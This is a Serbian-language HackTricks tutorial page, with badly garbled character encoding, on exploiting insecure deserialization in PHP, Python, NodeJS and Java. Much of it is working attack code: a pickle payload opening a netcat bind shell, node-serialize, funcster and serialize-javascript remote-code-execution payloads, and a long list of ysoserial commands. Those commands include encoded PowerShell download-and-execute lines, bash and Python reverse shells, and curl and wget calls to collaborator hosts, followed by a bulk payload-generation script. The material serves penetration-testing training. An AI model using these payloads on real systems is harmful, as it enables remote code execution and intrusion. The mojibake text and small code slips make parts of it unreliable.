# Deserijalizacija

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite da vidite **vaÅ¡u kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJATELJSTVO**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## Osnovne informacije

**Serijalizacija** se shvata kao metoda pretvaranja objekta u format koji moÅ¾e biti saÄuvan, sa namerom da se objekat ili saÄuva ili prenese kao deo komunikacionog procesa. Ova tehnika se Äesto koristi kako bi se osiguralo da objekat moÅ¾e biti rekreiran u kasnijem trenutku, odrÅ¾avajuÄ‡i njegovu strukturu i stanje.

**Deserijalizacija**, suprotno tome, je proces koji neutraliÅ¡e serijalizaciju. UkljuÄuje uzimanje podataka koji su strukturirani u odreÄ‘enom formatu i rekonstruisanje ih nazad u objekat.

Deserijalizacija moÅ¾e biti opasna jer potencijalno **omoguÄ‡ava napadaÄima da manipuliÅ¡u serijalizovanim podacima kako bi izvrÅ¡ili Å¡tetan kod** ili izazvali neoÄekivano ponaÅ¡anje u aplikaciji tokom procesa rekonstrukcije objekta.

## PHP

U PHP-u, specifiÄne magiÄne metode se koriste tokom procesa serijalizacije i deserijalizacije:

* `__sleep`: Poziva se kada se objekat serijalizuje. Ova metoda treba da vrati niz imena svih svojstava objekta koja treba da budu serijalizovana. ÄŒesto se koristi za potvrÄ‘ivanje ÄekajuÄ‡ih podataka ili obavljanje sliÄnih zaduÅ¾enja za ÄiÅ¡Ä‡enje.
* `__wakeup`: Poziva se kada se objekat deserijalizuje. Koristi se za ponovno uspostavljanje bilo kakvih veza sa bazom podataka koje su moÅ¾da izgubljene tokom serijalizacije i obavljanje drugih zadataka ponovnog pokretanja.
* `__unserialize`: Ova metoda se poziva umesto `__wakeup` (ako postoji) kada se objekat deserijalizuje. PruÅ¾a viÅ¡e kontrole nad procesom deserijalizacije u poreÄ‘enju sa `__wakeup`.
* `__destruct`: Ova metoda se poziva kada se objekat uniÅ¡tava ili kada se skripta zavrÅ¡ava. ObiÄno se koristi za zadatke ÄiÅ¡Ä‡enja, poput zatvaranja fajl rukovaoca ili veza sa bazom podataka.
* `__toString`: Ova metoda omoguÄ‡ava da se objekat tretira kao string. MoÅ¾e se koristiti za Äitanje fajla ili druge zadatke na osnovu poziva funkcija unutar nje, efikasno pruÅ¾ajuÄ‡i tekstualnu reprezentaciju objekta.
```php
<?php
class test {
public $s = "This is a test";
public function displaystring(){
echo $this->s.'<br />';
}
public function __toString()
{
echo '__toString method called';
}
public function __construct(){
echo "__construct method called";
}
public function __destruct(){
echo "__destruct method called";
}
public function __wakeup(){
echo "__wakeup method called";
}
public function __sleep(){
echo "__sleep method called";
return array("s"); #The "s" makes references to the public attribute
}
}

$o = new test();
$o->displaystring();
$ser=serialize($o);
echo $ser;
$unser=unserialize($ser);
$unser->displaystring();

/*
php > $o = new test();
__construct method called
__destruct method called
php > $o->displaystring();
This is a test<br />

php > $ser=serialize($o);
__sleep method called

php > echo $ser;
O:4:"test":1:{s:1:"s";s:14:"This is a test";}

php > $unser=unserialize($ser);
__wakeup method called
__destruct method called

php > $unser->displaystring();
This is a test<br />
*/
?>
```
Ako pogledate rezultate, moÅ¾ete videti da se funkcije **`__wakeup`** i **`__destruct`** pozivaju prilikom deserializacije objekta. Imajte na umu da u nekoliko tutorijala Ä‡ete pronaÄ‡i da se funkcija **`__toString`** poziva prilikom pokuÅ¡aja Å¡tampanja nekog atributa, ali izgleda da se to **viÅ¡e ne deÅ¡ava**.

{% hint style="warning" %}
Metoda **`__unserialize(array $data)`** se poziva **umesto `__wakeup()`** ako je implementirana u klasi. OmoguÄ‡ava vam da deserializujete objekat pruÅ¾ajuÄ‡i serijske podatke kao niz. MoÅ¾ete koristiti ovu metodu da deserializujete osobine i obavite sve potrebne zadatke prilikom deserializacije.
```php
class MyClass {
private $property;

public function __unserialize(array $data): void {
$this->property = $data['property'];
// Perform any necessary tasks upon deserialization.
}
}
```
{% endhint %}

MoÅ¾ete proÄitati objaÅ¡njen **PHP primer ovde**: [https://www.notsosecure.com/remote-code-execution-via-php-unserialize/](https://www.notsosecure.com/remote-code-execution-via-php-unserialize/), ovde [https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf](https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf) ili ovde [https://securitycafe.ro/2015/01/05/understanding-php-object-injection/](https://securitycafe.ro/2015/01/05/understanding-php-object-injection/)

### PHP Deserial + Autoload Classes

MoÅ¾ete zloupotrebiti PHP autoload funkcionalnost da uÄitate proizvoljne php fajlove i viÅ¡e:

{% content-ref url="php-deserialization-+-autoload-classes.md" %}
[php-deserialization-+-autoload-classes.md](php-deserialization-+-autoload-classes.md)
{% endcontent-ref %}

### Serijalizacija Referenciranih Vrednosti

Ako iz nekog razloga Å¾elite da serijalizujete vrednost kao **referencu na drugu serijalizovanu vrednost** moÅ¾ete:
```php
<?php
class AClass {
public $param1;
public $param2;
}

$o = new WeirdGreeting;
$o->param1 =& $o->param22;
$o->param = "PARAM";
$ser=serialize($o);
```
### PHPGGC (ysoserial za PHP)

[**PHPGGC**](https://github.com/ambionics/phpggc) moÅ¾e vam pomoÄ‡i da generiÅ¡ete payload-ove za zloupotrebu PHP deserijalizacije.\
Imajte na umu da u nekoliko sluÄajeva **neÄ‡ete moÄ‡i pronaÄ‡i naÄin za zloupotrebu deserijalizacije u izvornom kodu** aplikacije, ali biste moÅ¾da mogli **zloupotrebiti kod spoljnih PHP ekstenzija.**\
Dakle, ako moÅ¾ete, proverite `phpinfo()` servera i **traÅ¾ite na internetu** (Äak i na **gadgetima** **PHPGGC**) neki moguÄ‡i gadget koji biste mogli zloupotrebiti.

### deserijalizacija metapodataka phar://

Ako ste pronaÅ¡li LFI koji samo Äita datoteku i ne izvrÅ¡ava PHP kod unutar nje, na primer koristeÄ‡i funkcije poput _**file\_get\_contents(), fopen(), file() ili file\_exists(), md5\_file(), filemtime() ili filesize()**_. MoÅ¾ete pokuÅ¡ati zloupotrebiti **deserijalizaciju** koja se deÅ¡ava prilikom **Äitanja** datoteke koristeÄ‡i protokol **phar**.\
Za viÅ¡e informacija proÄitajte sledeÄ‡i post:

{% content-ref url="../file-inclusion/phar-deserialization.md" %}
[phar-deserialization.md](../file-inclusion/phar-deserialization.md)
{% endcontent-ref %}

## Python

### **Pickle**

Kada se objekat depickla, funkcija _\_\_reduce\_\__ Ä‡e biti izvrÅ¡ena.\
Kada se iskoristi, server bi mogao vratiti greÅ¡ku.
```python
import pickle, os, base64
class P(object):
def __reduce__(self):
return (os.system,("netcat -c '/bin/bash -i' -l -p 1234 ",))
print(base64.b64encode(pickle.dumps(P())))
```
Za viÅ¡e informacija o bekstvu iz **pickle zatvora** pogledajte:

{% content-ref url="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/" %}
[bypass-python-sandboxes](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/)
{% endcontent-ref %}

### Yaml **&** jsonpickle

Na sledeÄ‡oj stranici je prikazana tehnika zloupotrebe nesigurne deserijalizacije u yaml Python bibliotekama, zavrÅ¡ava se alatom koji se moÅ¾e koristiti za generisanje RCE deserijalizacijskog payload-a za **Pickle, PyYAML, jsonpickle i ruamel.yaml**:

{% content-ref url="python-yaml-deserialization.md" %}
[python-yaml-deserialization.md](python-yaml-deserialization.md)
{% endcontent-ref %}

### ZagaÄ‘enje klasa (Python Prototip ZagaÄ‘enje)

{% content-ref url="../../generic-methodologies-and-resources/python/class-pollution-pythons-prototype-pollution.md" %}
[class-pollution-pythons-prototype-pollution.md](../../generic-methodologies-and-resources/python/class-pollution-pythons-prototype-pollution.md)
{% endcontent-ref %}

## NodeJS

### JS MagiÄne Funkcije

JS **nema "magiÄne" funkcije** poput PHP-a ili Python-a koje Ä‡e se izvrÅ¡iti samo prilikom kreiranja objekta. Ali ima neke **funkcije** koje se **Äesto koriste Äak i bez direktnog pozivanja** kao Å¡to su **`toString`**, **`valueOf`**, **`toJSON`**.\
Ako zloupotrebite deserijalizaciju, moÅ¾ete **ugroziti ove funkcije da izvrÅ¡e drugi kod** (potencijalno zloupotrebljavajuÄ‡i zagaÄ‘enje prototipa) i moÅ¾ete izvrÅ¡iti proizvoljan kod kada se pozovu.

JoÅ¡ jedan **"magiÄan" naÄin pozivanja funkcije** bez direktnog pozivanja je **ugroÅ¾avanje objekta koji vraÄ‡a asinhrona funkcija** (promise). Jer, ako **transformiÅ¡ete** taj **vraÄ‡eni objekat** u drugi **promise** sa **svojstvom** nazvanim **"then" tipa funkcija**, biÄ‡e **izvrÅ¡en** samo zato Å¡to je vraÄ‡en od drugog promise-a. _Pratite_ [_**ovaj link**_](https://blog.huli.tw/2022/07/11/en/googlectf-2022-horkos-writeup/) _za viÅ¡e informacija._
```javascript
// If you can compromise p (returned object) to be a promise
// it will be executed just because it's the return object of an async function:
async function test_resolve() {
const p = new Promise(resolve => {
console.log('hello')
resolve()
})
return p
}

async function test_then() {
const p = new Promise(then => {
console.log('hello')
return 1
})
return p
}

test_ressolve()
test_then()
//For more info: https://blog.huli.tw/2022/07/11/en/googlectf-2022-horkos-writeup/
```
### `__proto__` Ğ¸ `prototype` Ğ·Ğ°Ğ³Ğ°Ñ’ĞµÑšĞµ

ĞĞºĞ¾ Å¾elite da saznate viÅ¡e o ovoj tehnici **pogledajte sledeÄ‡i tutorijal**:

{% content-ref url="nodejs-proto-prototype-pollution/" %}
[nodejs-proto-prototype-pollution](nodejs-proto-prototype-pollution/)
{% endcontent-ref %}

### [node-serialize](https://www.npmjs.com/package/node-serialize)

Ova biblioteka omoguÄ‡ava serializaciju funkcija. Primer:
```javascript
var y = {
"rce": function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })},
}
var serialize = require('node-serialize');
var payload_serialized = serialize.serialize(y);
console.log("Serialized: \n" + payload_serialized);
```
**Serializovani objekat** Ä‡e izgledati ovako:
```bash
{"rce":"_$$ND_FUNC$$_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })}"}
```
MoÅ¾ete videti u primeru da kada je funkcija serializovana, zastava `_$$ND_FUNC$$_` se dodaje serializovanom objektu.

Unutar fajla `node-serialize/lib/serialize.js` moÅ¾ete pronaÄ‡i istu zastavu i kako je kod koristi.

![](<../../.gitbook/assets/image (348).png>)

![](<../../.gitbook/assets/image (443).png>)

Kao Å¡to moÅ¾ete videti u poslednjem delu koda, **ako se pronaÄ‘e zastava**, `eval` se koristi za deserializaciju funkcije, tako da se **korisniÄki unos koristi unutar funkcije `eval`**.

MeÄ‘utim, **samo serializovanje** funkcije **neÄ‡e je izvrÅ¡iti** jer bi bilo potrebno da neki deo koda **poziva `y.rce`** u naÅ¡em primeru, Å¡to je veoma **neverovatno**.\
U svakom sluÄaju, moÅ¾ete **izmeniti serializovani objekat** **dodavanjem zagrada** kako biste automatski izvrÅ¡ili serializovanu funkciju prilikom deserializacije objekta.\
U sledeÄ‡em delu koda **obratite paÅ¾nju na poslednje zagrade** i kako Ä‡e funkcija `unserialize` automatski izvrÅ¡iti kod:
```javascript
var serialize = require('node-serialize');
var test = {"rce":"_$$ND_FUNC$$_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) }); }()"};
serialize.unserialize(test);
```
Kao Å¡to je prethodno naznaÄeno, ova biblioteka Ä‡e dobiti kod nakon `_$$ND_FUNC$$_` i **izvrÅ¡iti ga** koristeÄ‡i `eval`. Stoga, kako bi se **automatski izvrÅ¡io kod**, moÅ¾ete **izbrisati deo kreiranja funkcije** i poslednju zagradu i **samo izvrÅ¡iti JS jednolinijski kod** kao u sledeÄ‡em primeru:
```javascript
var serialize = require('node-serialize');
var test = '{"rce":"_$$ND_FUNC$$_require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) })"}';
serialize.unserialize(test);
```
MoÅ¾ete [**ovde pronaÄ‡i**](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/) **dodatne informacije** o tome kako iskoristiti ovu ranjivost.

### [funcster](https://www.npmjs.com/package/funcster)

ZnaÄajna karakteristika **funcster**-a je nedostupnost **standardnih ugraÄ‘enih objekata**; oni se nalaze van dostupnog opsega. Ovo ograniÄenje spreÄava izvrÅ¡avanje koda koji pokuÅ¡ava da pozove metode na ugraÄ‘enim objektima, Å¡to dovodi do izuzetaka poput `"ReferenceError: console is not defined"` kada se koriste komande poput `console.log()` ili `require(something)`.

Ipak, uprkos ovom ograniÄenju, moguÄ‡e je povratiti pun pristup globalnom kontekstu, ukljuÄujuÄ‡i sve standardne ugraÄ‘ene objekte, kroz odreÄ‘eni pristup. KoriÅ¡Ä‡enjem globalnog konteksta direktno, moguÄ‡e je zaobiÄ‡i ovo ograniÄenje. Na primer, pristup moÅ¾e biti ponovo uspostavljen koriÅ¡Ä‡enjem sledeÄ‡eg iseÄka koda:
```javascript
funcster = require("funcster");
//Serialization
var test = funcster.serialize(function() { return "Hello world!" })
console.log(test) // { __js_function: 'function(){return"Hello world!"}' }

//Deserialization with auto-execution
var desertest1 = { __js_function: 'function(){return "Hello world!"}()' }
funcster.deepDeserialize(desertest1)
var desertest2 = { __js_function: 'this.constructor.constructor("console.log(1111)")()' }
funcster.deepDeserialize(desertest2)
var desertest3 = { __js_function: 'this.constructor.constructor("require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) });")()' }
funcster.deepDeserialize(desertest3)
```
**Za** [**viÅ¡e informacija proÄitajte ovaj izvor**](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)**.**

### [**serialize-javascript**](https://www.npmjs.com/package/serialize-javascript)

Paket **serialize-javascript** je dizajniran iskljuÄivo za svrhe serializacije, bez ugraÄ‘enih moguÄ‡nosti za deserializaciju. Korisnici su odgovorni za implementaciju sopstvene metode za deserializaciju. Direktna upotreba `eval`-a je predloÅ¾ena u zvaniÄnom primeru za deserializaciju serializovanih podataka:
```javascript
function deserialize(serializedJavascript){
return eval('(' + serializedJavascript + ')');
}
```
Ako se ova funkcija koristi za deserijalizaciju objekata, moÅ¾ete je **lako iskoristiti**:
```javascript
var serialize = require('serialize-javascript');
//Serialization
var test = serialize(function() { return "Hello world!" });
console.log(test) //function() { return "Hello world!" }

//Deserialization
var test = "function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) }); }()"
deserialize(test)
```
**Za** [**viÅ¡e informacija proÄitajte ovaj izvor**](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)**.**

### Cryo biblioteka

Na sledeÄ‡im stranicama moÅ¾ete pronaÄ‡i informacije o tome kako zloupotrebiti ovu biblioteku da biste izvrÅ¡ili proizvoljne komande:

* [https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)
* [https://hackerone.com/reports/350418](https://hackerone.com/reports/350418)

## Java - HTTP

U Javi, **callback-ovi za deserializaciju se izvrÅ¡avaju tokom procesa deserializacije**. Ovu izvrÅ¡nu moÄ‡ mogu iskoristiti napadaÄi koji kreiraju zlonamerne "payload"-e koji pokreÄ‡u ove callback-ove, Å¡to moÅ¾e dovesti do potencijalnog izvrÅ¡enja Å¡tetnih akcija.

### Otisci prstiju

#### White Box

Da biste identifikovali potencijalne ranjivosti serijalizacije u kodnoj bazi, potraÅ¾ite:

* Klase koje implementiraju interfejs `Serializable`.
* KoriÅ¡Ä‡enje funkcija `java.io.ObjectInputStream`, `readObject`, `readUnshare`.

Posebno obratite paÅ¾nju na:

* `XMLDecoder` koriÅ¡Ä‡en sa parametrima definisanim od strane spoljnih korisnika.
* `XStream`-ovu metodu `fromXML`, posebno ako je verzija XStream-a manja ili jednaka 1.46, jer je podloÅ¾na problemima sa serijalizacijom.
* `ObjectInputStream` uparen sa metodom `readObject`.
* Implementacija metoda poput `readObject`, `readObjectNodData`, `readResolve` ili `readExternal`.
* `ObjectInputStream.readUnshared`.
* OpÅ¡ta upotreba `Serializable`.

#### Black Box

Za testiranje crne kutije, potraÅ¾ite specifiÄne **potpise ili "Magic Bytes"** koji oznaÄavaju java serijalizovane objekte (potiÄuÄ‡i od `ObjectInputStream`):

* Heksadecimalni obrazac: `AC ED 00 05`.
* Base64 obrazac: `rO0`.
* HTTP odgovori sa zaglavljima `Content-type` postavljenim na `application/x-java-serialized-object`.
* Heksadecimalni obrazac koji ukazuje na prethodnu kompresiju: `1F 8B 08 00`.
* Base64 obrazac koji ukazuje na prethodnu kompresiju: `H4sIA`.
* Veb fajlovi sa ekstenzijom `.faces` i parametrom `faces.ViewState`. Otkrivanje ovih obrazaca u veb aplikaciji trebalo bi da podstakne ispitivanje kako je detaljno opisano u [postu o Java JSF ViewState Deserializaciji](java-jsf-viewstate-.faces-deserialization.md).
```
javax.faces.ViewState=rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAJwdAAML2xvZ2luLnhodG1s
```
### Provera ranjivosti

Ako Å¾elite da **saÅ¾nate kako funkcioniÅ¡e Java Deserialized eksploatacija**, trebalo bi da pogledate [**Osnovnu Java Deserializaciju**](basic-java-deserialization-objectinputstream-readobject.md), [**Java DNS Deserializaciju**](java-dns-deserialization-and-gadgetprobe.md) i [**CommonsCollection1 Payload**](java-transformers-to-rutime-exec-payload.md).

#### Testiranje belom kutijom

MoÅ¾ete proveriti da li je instalirana neka aplikacija sa poznatim ranjivostima.
```bash
find . -iname "*commons*collection*"
grep -R InvokeTransformer .
```
MoÅ¾ete pokuÅ¡ati **proveriti sve biblioteke** za koje se zna da su ranjive i za koje [**Ysoserial**](https://github.com/frohoff/ysoserial) moÅ¾e pruÅ¾iti eksploataciju. Ili moÅ¾ete proveriti biblioteke navedene na [Java-Deserialization-Cheat-Sheet](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#genson-json).\
TakoÄ‘e moÅ¾ete koristiti [**gadgetinspector**](https://github.com/JackOfMostTrades/gadgetinspector) da pretraÅ¾ite moguÄ‡e lance gedÅ¾eta koji se mogu iskoristiti.\
Prilikom pokretanja **gadgetinspectora** (nakon izgradnje), ne brinite o gomili upozorenja/greÅ¡aka kroz koje prolazi i pustite ga da zavrÅ¡i. Sve rezultate Ä‡e zapisati pod _gadgetinspector/gadget-results/gadget-chains-year-month-day-hore-min.txt_. Imajte na umu da **gadgetinspector neÄ‡e kreirati eksploataciju i moÅ¾e pokazati laÅ¾ne pozitivne rezultate**.

#### Test Crne Kutije

KoriÅ¡Ä‡enjem Burp ekstenzije [**gadgetprobe**](java-dns-deserialization-and-gadgetprobe.md) moÅ¾ete identifikovati **koje biblioteke su dostupne** (Äak i verzije). Sa ovim informacijama bi moglo biti **jednostavnije izabrati payload** za iskoriÅ¡Ä‡avanje ranjivosti.\
[**ProÄitajte ovo da biste saznali viÅ¡e o GadgetProbe**](java-dns-deserialization-and-gadgetprobe.md#gadgetprobe)**.**\
GadgetProbe je fokusiran na **`ObjectInputStream` deserializacije**.

KoriÅ¡Ä‡enjem Burp ekstenzije [**Java Deserialization Scanner**](java-dns-deserialization-and-gadgetprobe.md#java-deserialization-scanner) moÅ¾ete **identifikovati ranjive biblioteke** koje se mogu iskoristiti sa ysoserial i ih **iskoristiti**.\
[**ProÄitajte ovo da biste saznali viÅ¡e o Java Deserialization Scanneru.**](java-dns-deserialization-and-gadgetprobe.md#java-deserialization-scanner)\
Java Deserialization Scanner je fokusiran na **`ObjectInputStream`** deserializacije.

TakoÄ‘e moÅ¾ete koristiti [**Freddy**](https://github.com/nccgroup/freddy) da otkrijete ranjivosti deserializacije u **Burp**-u. Ovaj dodatak Ä‡e otkriti ranjivosti koje nisu samo povezane sa **`ObjectInputStream`** veÄ‡ i ranjivosti iz biblioteka za deserializaciju **Json** i **Yml**. U aktivnom reÅ¾imu, pokuÅ¡aÄ‡e da ih potvrdi koriÅ¡Ä‡enjem sleep ili DNS payloada.\
[**ViÅ¡e informacija o Freddy-u moÅ¾ete pronaÄ‡i ovde.**](https://www.nccgroup.com/us/about-us/newsroom-and-events/blog/2018/june/finding-deserialisation-issues-has-never-been-easier-freddy-the-serialisation-killer/)

**Testiranje Serijalizacije**

Nije sve u proveri da li server koristi ranjive biblioteke. Ponekad moÅ¾ete **promeniti podatke unutar serijalizovanog objekta i zaobiÄ‡i neke provere** (moÅ¾da vam omoguÄ‡iti administratorske privilegije unutar veb aplikacije).\
Ako pronaÄ‘ete java serijalizovan objekat koji se Å¡alje veb aplikaciji, moÅ¾ete koristiti [**SerializationDumper**](https://github.com/NickstaDB/SerializationDumper) **da Å¡tampate serijalizovani objekat koji se Å¡alje u formatu koji je Äitljiviji Äoveku**. Poznavanje podataka koje Å¡aljete olakÅ¡aÄ‡e vam da ih izmenite i zaobiÄ‘ete neke provere.

### **Eksploatacija**

#### **ysoserial**

Glavni alat za eksploataciju Java deserializacija je [**ysoserial**](https://github.com/frohoff/ysoserial) ([**preuzmite ovde**](https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar)). TakoÄ‘e moÅ¾ete razmotriti koriÅ¡Ä‡enje [**ysoseral-modified**](https://github.com/pimps/ysoserial-modified) koji Ä‡e vam omoguÄ‡iti koriÅ¡Ä‡enje kompleksnih komandi (sa cevima na primer).\
Imajte na umu da je ovaj alat **usmeren** na iskoriÅ¡Ä‡avanje **`ObjectInputStream`**.\
PreporuÄujem da **poÄnete sa "URLDNS"** payloadom **pre RCE** payloada da biste testirali da li je ubrizgavanje moguÄ‡e. U svakom sluÄaju, imajte na umu da moÅ¾da "URLDNS" payload ne radi, ali drugi RCE payload moÅ¾e.
```bash
# PoC to make the application perform a DNS req
java -jar ysoserial-master-SNAPSHOT.jar URLDNS http://b7j40108s43ysmdpplgd3b7rdij87x.burpcollaborator.net > payload

# PoC RCE in Windows
# Ping
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections5 'cmd /c ping -n 5 127.0.0.1' > payload
# Time, I noticed the response too longer when this was used
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c timeout 5" > payload
# Create File
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c echo pwned> C:\\\\Users\\\\username\\\\pwn" > payload
# DNS request
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c nslookup jvikwa34jwgftvoxdz16jhpufllb90.burpcollaborator.net"
# HTTP request (+DNS)
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c certutil -urlcache -split -f http://j4ops7g6mi9w30verckjrk26txzqnf.burpcollaborator.net/a a"
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAYwBlADcAMABwAG8AbwB1ADAAaABlAGIAaQAzAHcAegB1AHMAMQB6ADIAYQBvADEAZgA3ADkAdgB5AC4AYgB1AHIAcABjAG8AbABsAGEAYgBvAHIAYQB0AG8AcgAuAG4AZQB0AC8AYQAnACkA"
## In the ast http request was encoded: IEX(New-Object Net.WebClient).downloadString('http://1ce70poou0hebi3wzus1z2ao1f79vy.burpcollaborator.net/a')
## To encode something in Base64 for Windows PS from linux you can use: echo -n "<PAYLOAD>" | iconv --to-code UTF-16LE | base64 -w0
# Reverse Shell
## Encoded: IEX(New-Object Net.WebClient).downloadString('http://192.168.1.4:8989/powercat.ps1')
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4ANAA6ADgAOQA4ADkALwBwAG8AdwBlAHIAYwBhAHQALgBwAHMAMQAnACkA"

#PoC RCE in Linux
# Ping
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "ping -c 5 192.168.1.4" > payload
# Time
## Using time in bash I didn't notice any difference in the timing of the response
# Create file
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "touch /tmp/pwn" > payload
# DNS request
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "dig ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "nslookup ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
# HTTP request (+DNS)
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "curl ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net" > payload
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "wget ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
# Reverse shell
## Encoded: bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}" | base64 -w0
## Encoded: export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "bash -c {echo,ZXhwb3J0IFJIT1NUPSIxMjcuMC4wLjEiO2V4cG9ydCBSUE9SVD0xMjM0NTtweXRob24gLWMgJ2ltcG9ydCBzeXMsc29ja2V0LG9zLHB0eTtzPXNvY2tldC5zb2NrZXQoKTtzLmNvbm5lY3QoKG9zLmdldGVudigiUkhPU1QiKSxpbnQob3MuZ2V0ZW52KCJSUE9SVCIpKSkpO1tvcy5kdXAyKHMuZmlsZW5vKCksZmQpIGZvciBmZCBpbiAoMCwxLDIpXTtwdHkuc3Bhd24oIi9iaW4vc2giKSc=}|{base64,-d}|{bash,-i}"

# Base64 encode payload in base64
base64 -w0 payload
```
Prilikom kreiranja payload-a za **java.lang.Runtime.exec()** ne moÅ¾ete koristiti specijalne karaktere poput ">" ili "|" za preusmeravanje izlaza izvrÅ¡enja, "$()" za izvrÅ¡avanje komandi ili Äak **prosleÄ‘ivanje argumenata** komandi razdvojenih **razmacima** (moÅ¾ete uraditi `echo -n "hello world"` ali ne moÅ¾ete uraditi `python2 -c 'print "Hello world"'`). Da biste pravilno enkodovali payload, moÅ¾ete [koristiti ovu veb stranicu](http://www.jackson-t.ca/runtime-exec-payloads.html).

Slobodno koristite sledeÄ‡i skript za kreiranje **svih moguÄ‡ih payload-a za izvrÅ¡avanje koda** za Windows i Linux, a zatim ih testirajte na ranjivoj veb stranici:
```python
import os
import base64

# You may need to update the payloads
payloads = ['BeanShell1', 'Clojure', 'CommonsBeanutils1', 'CommonsCollections1', 'CommonsCollections2', 'CommonsCollections3', 'CommonsCollections4', 'CommonsCollections5', 'CommonsCollections6', 'CommonsCollections7', 'Groovy1', 'Hibernate1', 'Hibernate2', 'JBossInterceptors1', 'JRMPClient', 'JSON1', 'JavassistWeld1', 'Jdk7u21', 'MozillaRhino1', 'MozillaRhino2', 'Myfaces1', 'Myfaces2', 'ROME', 'Spring1', 'Spring2', 'Vaadin1', 'Wicket1']
def generate(name, cmd):
for payload in payloads:
final = cmd.replace('REPLACE', payload)
print 'Generating ' + payload + ' for ' + name + '...'
command = os.popen('java -jar ysoserial.jar ' + payload + ' "' + final + '"')
result = command.read()
command.close()
encoded = base64.b64encode(result)
if encoded != "":
open(name + '_intruder.txt', 'a').write(encoded + '\n')

generate('Windows', 'ping -n 1 win.REPLACE.server.local')
generate('Linux', 'ping -c 1 nix.REPLACE.server.local')
```
#### serialkillerbypassgadgets

